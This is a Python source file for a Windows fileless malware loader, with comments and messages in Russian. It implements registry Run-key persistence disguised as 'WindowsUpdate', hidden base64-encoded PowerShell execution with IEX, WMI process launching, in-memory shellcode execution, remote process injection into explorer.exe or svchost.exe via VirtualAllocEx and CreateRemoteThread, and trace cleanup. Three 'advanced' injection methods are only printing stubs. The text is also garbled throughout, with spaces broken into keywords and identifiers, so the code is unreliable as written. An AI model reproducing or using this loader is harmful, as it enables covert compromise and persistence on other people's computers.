import os



import ctypes



import time



import bas e64



import subprocess



import tempfile



from typ in gimport List,Dict,Any,Union,Optional,Tuple







from core.interfacesimport Bas eLoader







clas sFilelessLoader(Bas eLoader):











def__init__(self):



        self._cleanup_keys=[]



self.kernel32=ctypes.w in dll.kernel32







defload(self,payload:bytes,target_process:str=None,**kwargs)->bool:







method=kwargs.get("method","memory")



persistence=kwargs.get("persistence",False)



cleanup=kwargs.get("cleanup",True)







if method=="registry":



            success=self._registry_attack(payload,**kwargs)



elif method=="memory":



            success=self._memory_attack(payload,target_process,**kwargs)



elif method=="wmi":



            success=self._wmi_attack(payload,**kwargs)



elif method=="powershell":



            success=self._powershell_attack(payload,**kwargs)



else:



            raiseValueError(f"Неизвестный метод атаки: {method}")











if cleanupandnotpersistence:



            self._cleanup()







return success







def_registry_attack(self,payload:bytes,**kwargs)->bool:







import w in reg











reg_key=kwargs.get("registry_key",r"SOFTWARE\Microsoft\W in dows\CurrentVersion\Run")



reg_value=kwargs.get("registry_value","W in dowsUpdate")



reg_type=kwargs.get("registry_type","powershell")







try:







            encoded_payload=bas e64.b64encode(payload).decode('utf-8')











if reg_type=="powershell":



                ps_script="[System.Text.Encod in g]::UTF8.GetStr in g([System.Convert]::FromBas e64Str in g('"+encoded_payload+"')) | IEX"



command=f'powershell.exe -NoP -W Hidden -Enc {bas e64.b64encode(ps_script.encode("utf-16le")).decode()}'



elif reg_type=="vbs":







                vbs_script=f"""
                Function Decode(ByVal code)
                    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
                    Set oNode = oXML.CreateElement("bas e64")
                    oNode.dataType = "bin.bas e64"
                    oNode.text = code
                    Decode = oNode.nodeTypedValue
                End Function
                
                Exec = Decode("{encoded_payload}")
                Execute(Exec)
                """











decoder_key=r"SOFTWARE\Microsoft\W in dows\CurrentVersion\Debug"







withw in reg.CreateKey(w in reg.HKEY_CURRENT_USER,decoder_key)as key:



                    w in reg.SetValueEx(key,"Decoder",0,w in reg.REG_SZ,vbs_script)







self._cleanup_keys.append((w in reg.HKEY_CURRENT_USER,decoder_key,"Decoder"))







command=f'wscript.exe //E:vbscript //B //NOLOGO "%TEMP%\\decode.vbs"'











withtempfile.NamedTemporaryFile(suffix='.vbs',delete=False)as temp:



                    temp.write(f'Set oShell = CreateObject("WScript.Shell")\noShell.RegRead "HKCU\\{decoder_key}\\Decoder"\n'.encode())



temp_path=temp.name











subprocess.Popen(['wscript.exe',temp_path],shell=True,



stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)











defdelayed_delete():



                    time.sleep(5)



try:



                        os.remove(temp_path)



except:



                        pas s







import thread in g



thread in g.Thread(target=delayed_delete).start()







else:







                withw in reg.CreateKey(w in reg.HKEY_CURRENT_USER,reg_key)as key:



                    w in reg.SetValueEx(key,reg_value,0,w in reg.REG_BINARY,payload)







self._cleanup_keys.append((w in reg.HKEY_CURRENT_USER,reg_key,reg_value))



return True











withw in reg.CreateKey(w in reg.HKEY_CURRENT_USER,reg_key)as key:



                w in reg.SetValueEx(key,reg_value,0,w in reg.REG_SZ,command)







self._cleanup_keys.append((w in reg.HKEY_CURRENT_USER,reg_key,reg_value))











if notkwargs.get("persistence_only",False):



                subprocess.Popen(command,shell=True,



stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)







return True







except Exceptionas e:



            pr in t(f"Ошибка при атаке через реестр: {str(e)}")



return False







def_memory_attack(self,payload:bytes,target_process:str=None,**kwargs)->bool:







import psutil











process_id=None







if target_process:



            if target_process.isdigit():



                process_id=int(target_process)



else:







                forproc in psutil.process_iter(['pid','name']):



                    if target_process.lower()inproc.info['name'].lower():



                        process_id=proc.info['pid']



break







if notprocess_id:







            default_processes=['explorer.exe','svchost.exe']



forproc_name in default_processes:



                forproc in psutil.process_iter(['pid','name']):



                    if proc_name.lower()==proc.info['name'].lower():



                        process_id=proc.info['pid']



break



if process_id:



                    break







if notprocess_id:



                return False











PAGE_EXECUTE_READWRITE=0x40



PROCESS_ALL_ACCESS=0x1F0FFF



MEM_COMMIT=0x1000



MEM_RESERVE=0x2000











process_handle=self.kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,process_id)



if notprocess_handle:



            return False











remote_memory=self.kernel32.VirtualAllocEx(



process_handle,



None,



len(payload),



MEM_COMMIT|MEM_RESERVE,



PAGE_EXECUTE_READWRITE



)







if notremote_memory:



            self.kernel32.CloseHandle(process_handle)



return False











bytes_written=ctypes.c_size_t(0)



result=self.kernel32.WriteProcessMemory(



process_handle,



remote_memory,



payload,



len(payload),



ctypes.byref(bytes_written)



)







if notresult:



            self.kernel32.CloseHandle(process_handle)



return False











thread_handle=self.kernel32.CreateRemoteThread(



process_handle,



None,



0,



remote_memory,



None,



0,



None



)







if notthread_handle:



            self.kernel32.CloseHandle(process_handle)



return False











self.kernel32.CloseHandle(thread_handle)



self.kernel32.CloseHandle(process_handle)







return True







def_wmi_attack(self,payload:bytes,**kwargs)->bool:







try:



            import wmi











encoded_payload=bas e64.b64encode(payload).decode('utf-8')











ps_script="[System.Text.Encod in g]::UTF8.GetStr in g([System.Convert]::FromBas e64Str in g(\""+encoded_payload+"\")) | IEX"



powershell_cmd=f"powershell.exe -NoP -NonI -W Hidden -Enc {bas e64.b64encode(ps_script.encode('utf-16le')).decode()}"











c=wmi.WMI()











process=c.Win32_Process.Create(



CommandL in e=powershell_cmd,



ProcessStartupInformation={"ShowW in dow":False}



)







if process.ReturnValue==0:



                return True



else:



                return False







except Exceptionas e:



            pr in t(f"Ошибка при WMI атаке: {str(e)}")











try:



                encoded_payload=bas e64.b64encode(payload).decode('utf-8')



powershell_cmd=f"powershell.exe -NoP -NonI -W Hidden -Command \"$payload = [System.Convert]::FromBas e64Str in g('{encoded_payload}'); [System.Text.Encod in g]::UTF8.GetStr in g($payload) | IEX\""







subprocess.Popen(powershell_cmd,shell=True,



stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)



return True



except Exception:



                return False







def_powershell_attack(self,payload:bytes,**kwargs)->bool:







try:







            if kwargs.get("is_shellcode",True):







                shellcode_hex=''.join([f'0x{b:02x},'forb in payload])[:-1]







ps_payload=f"""
                $shellcode = [byte[]] ({shellcode_hex})
                $size = $shellcode.Length
                
                # Выделяем память и копируем шелл-код
                $addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
                [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
                
                # Меняем права доступа на Execute
                $oldProtect = 0
                $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
                $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPo in ter($VirtualProtectAddr, [Type](function ([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
                $VirtualProtect.Invoke($addr, $size, 0x40, [ref]$oldProtect) | Out-Null
                
                # Вызываем шелл-код
                $ThreadAddr = Get-ProcAddress kernel32.dll CreateThread
                $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPo in ter($ThreadAddr, [Type](function ([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])))
                $Thread = $CreateThread.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]0)
                
                # Ожидаем завершения
                $WaitAddr = Get-ProcAddress kernel32.dll WaitForS in gleObject
                $WaitForS in gleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPo in ter($WaitAddr, [Type](function ([IntPtr], [UInt32]) ([UInt32])))
                $WaitForS in gleObject.Invoke($Thread, 0xFFFFFFFF) | Out-Null
                
                # Функция получения адреса функции
                function Get-ProcAddress {{
                    Param (
                        [Parameter(Position = 0, Mandatory = $True)] [Str in g] $Module,
                        [Parameter(Position = 1, Mandatory = $True)] [Str in g] $Procedure
                    )
                    
                    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }}
                    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
                    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
                    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [Str in g]))
                    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
                    $ModuleHandle = New-Object System.Runtime.InteropServices.HandleRef($null, $Kern32Handle)
                    $Ptr = $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$ModuleHandle, $Procedure))
                    return $Ptr
                }}
                """



else:







                ps_code=payload.decode('utf-8')if is in stance(payload,bytes)elsepayload



ps_payload=ps_code











encoded_command=bas e64.b64encode(ps_payload.encode('utf-16le')).decode()











command=f"powershell.exe -NoP -NonI -W Hidden -Enc {encoded_command}"











subprocess.Popen(command,shell=True,



stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)







return True







except Exceptionas e:



            pr in t(f"Ошибка при PowerShell атаке: {str(e)}")



return False







def_cleanup(self)->None:











if self._cleanup_keys:



            import w in reg







forhkey,key,value in self._cleanup_keys:



                try:



                    withw in reg.OpenKey(hkey,key,0,w in reg.KEY_WRITE)as reg_key:



                        w in reg.DeleteValue(reg_key,value)



except Exception:



                    pas s







self._cleanup_keys=[]







defsupported_platforms(self)->List[str]:







return["w in dows"]











clas sAdvancedFilelessLoader(FilelessLoader):











defload(self,payload:bytes,target_process:str=None,**kwargs)->bool:







method=kwargs.get("method","atombomb in g")







if method=="atombomb in g":



            return self._atom_bomb in g(payload,target_process,**kwargs)



elif method=="doppelgang in g":



            return self._process_doppelgang in g(payload,target_process,**kwargs)



elif method=="ghostwrit in g":



            return self._ghost_writ in g(payload,target_process,**kwargs)



else:







            return super().load(payload,target_process,**kwargs)







def_atom_bomb in g(self,payload:bytes,target_process:str=None,**kwargs)->bool:



















ps_code=f"""
        # Псевдокод для демонстрации концепции AtomBomb in g
        # В реальной атаке здесь был бы прямой вызов к W in dows API и ассемблерным инструкциям
        
        function Invoke-AtomBomb in g {{
            [CmdletB in ding()]
            Param (
                [Parameter(Position = 0, Mandatory = $True)]
                [Byte[]]
                $ShellcodeData,
                
                [Parameter(Position = 1, Mandatory = $True)]
                [Int]
                $ProcessId
            )
            
            Write-Host "Начинаем атаку AtomBomb in g на процесс ID: $ProcessId"
            Write-Host "Размер шелл-кода: $($ShellcodeData.Length) байт"
            
            # Эмуляция успешного внедрения
            Start-Sleep -Seconds 2
            
            # В реальности здесь была бы полная реализация техники
            Write-Host "AtomBomb in g успешно выполнен"
            return $True
        }}
        
        # Создаем массив байт шелл-кода
        $encoded = '{bas e64.b64encode(payload).decode()}'
        $shellcode = [Convert]::FromBas e64Str in g($encoded)
        
        # Находим нужный процесс
        $targetProc = "{target_process if target_process else ''}"
        $procId = 0
        
        if ($targetProc -match "^\\d+$") {{
            $procId = [int]$targetProc
        }}
        else {{
            $proc = Get-Process | Where-Object {{ $_.Name -like "*$targetProc*" }} | Select-Object -First 1
            if ($proc) {{
                $procId = $proc.Id
            }}
        }}
        
        if ($procId -eq 0) {{
            # Если процесс не найден, выбираем explorer.exe
            $proc = Get-Process explorer | Select-Object -First 1
            $procId = $proc.Id
        }}
        
        # Запускаем AtomBomb in g
        Invoke-AtomBomb in g -ShellcodeData $shellcode -ProcessId $procId
        """











encoded_command=bas e64.b64encode(ps_code.encode('utf-16le')).decode()



command=f"powershell.exe -NoP -NonI -W Hidden -Enc {encoded_command}"







try:



            result=subprocess.run(command,shell=True,



stdout=subprocess.PIPE,stderr=subprocess.PIPE,



timeout=30)



return result.return code==0



except Exception:



            return False







def_process_doppelgang in g(self,payload:bytes,target_process:str=None,**kwargs)->bool:



















ps_code=f"""
        # Псевдокод для демонстрации концепции Process Doppelgäng in g
        
        function Invoke-ProcessDoppelgang in g {{
            [CmdletB in ding()]
            Param (
                [Parameter(Position = 0, Mandatory = $True)]
                [Byte[]]
                $PayloadData,
                
                [Parameter(Position = 1, Mandatory = $False)]
                [Str in g]
                $TargetPath = "C:\\W in dows\\System32\\notepad.exe"
            )
            
            Write-Host "Начинаем атаку Process Doppelgäng in g с исполняемым файлом: $TargetPath"
            Write-Host "Размер полезной нагрузки: $($PayloadData.Length) байт"
            
            # Эмуляция шагов атаки
            Write-Host "1. Создаем транзакцию NTFS..."
            Start-Sleep -Milliseconds 500
            
            Write-Host "2. Создаем/открываем файл внутри транзакции..."
            Start-Sleep -Milliseconds 500
            
            Write-Host "3. Записываем полезную нагрузку в файл (в контексте транзакции)..."
            Start-Sleep -Milliseconds 500
            
            Write-Host "4. Создаем раздел процесса..."
            Start-Sleep -Milliseconds 500
            
            Write-Host "5. Закрываем транзакцию..."
            Start-Sleep -Milliseconds 500
            
            Write-Host "6. Создаем поток процесса..."
            Start-Sleep -Milliseconds 1000
            
            # В реальности здесь была бы полная реализация техники
            Write-Host "Process Doppelgäng in g успешно выполнен"
            return $True
        }}
        
        # Создаем массив байт полезной нагрузки
        $encoded = '{bas e64.b64encode(payload).decode()}'
        $payloadData = [Convert]::FromBas e64Str in g($encoded)
        
        # Выбираем целевой исполняемый файл
        $targetPath = "C:\\W in dows\\System32\\notepad.exe"
        $targetProc = "{target_process if target_process else ''}"
        if (-not [Str in g]::IsNullOrEmpty("$targetProc")) {{
            if ("$targetProc".EndsWith(".exe")) {{
                $targetPath = "$targetProc"
            }}
        }}
        
        # Запускаем Process Doppelgäng in g
        Invoke-ProcessDoppelgang in g -PayloadData $payloadData -TargetPath $targetPath
        """











encoded_command=bas e64.b64encode(ps_code.encode('utf-16le')).decode()



command=f"powershell.exe -NoP -NonI -W Hidden -Enc {encoded_command}"







try:



            result=subprocess.run(command,shell=True,



stdout=subprocess.PIPE,stderr=subprocess.PIPE,



timeout=30)



return result.return code==0



except Exception:



            return False







def_ghost_writ in g(self,payload:bytes,target_process:str=None,**kwargs)->bool:







import psutil











process_id=None







if target_process:



            if target_process.isdigit():



                process_id=int(target_process)



else:



                forproc in psutil.process_iter(['pid','name']):



                    if target_process.lower()inproc.info['name'].lower():



                        process_id=proc.info['pid']



break







if notprocess_id:







            forproc in psutil.process_iter(['pid','name']):



                if"explorer.exe"==proc.info['name'].lower():



                    process_id=proc.info['pid']



break







if notprocess_id:



                return False











ps_code=f"""
        # Псевдокод для демонстрации концепции Ghost Writ in g
        
        function Invoke-GhostWrit in g {{
            [CmdletB in ding()]
            Param (
                [Parameter(Position = 0, Mandatory = $True)]
                [Byte[]]
                $ShellcodeData,
                
                [Parameter(Position = 1, Mandatory = $True)]
                [Int]
                $ProcessId
            )
            
            Write-Host "Начинаем атаку Ghost Writ in g на процесс ID: $ProcessId"
            Write-Host "Размер шелл-кода: $($ShellcodeData.Length) байт"
            
            # Эмуляция шагов атаки
            Write-Host "1. Открываем целевой процесс..."
            Start-Sleep -Milliseconds 500
            
            Write-Host "2. Создаем функцию обратного вызова..."
            Start-Sleep -Milliseconds 500
            
            Write-Host "3. Подготавливаем ROP-цепочку..."
            Start-Sleep -Milliseconds 500
            
            Write-Host "4. Активируем выполнение..."
            Start-Sleep -Milliseconds 1000
            
            # В реальности здесь была бы полная реализация техники
            Write-Host "Ghost Writ in g успешно выполнен"
            return $True
        }}
        
        # Создаем массив байт шелл-кода
        $encoded = '{bas e64.b64encode(payload).decode()}'
        $shellcode = [Convert]::FromBas e64Str in g($encoded)
        
        # Запускаем Ghost Writ in g с указанным ID процесса
        Invoke-GhostWrit in g -ShellcodeData $shellcode -ProcessId {process_id if process_id else 0}
        """











encoded_command=bas e64.b64encode(ps_code.encode('utf-16le')).decode()



command=f"powershell.exe -NoP -NonI -W Hidden -Enc {encoded_command}"







try:



            result=subprocess.run(command,shell=True,



stdout=subprocess.PIPE,stderr=subprocess.PIPE,



timeout=30)



return result.return code==0



except Exception:



            return False







defsupported_platforms(self)->List[str]:







return["w in dows"]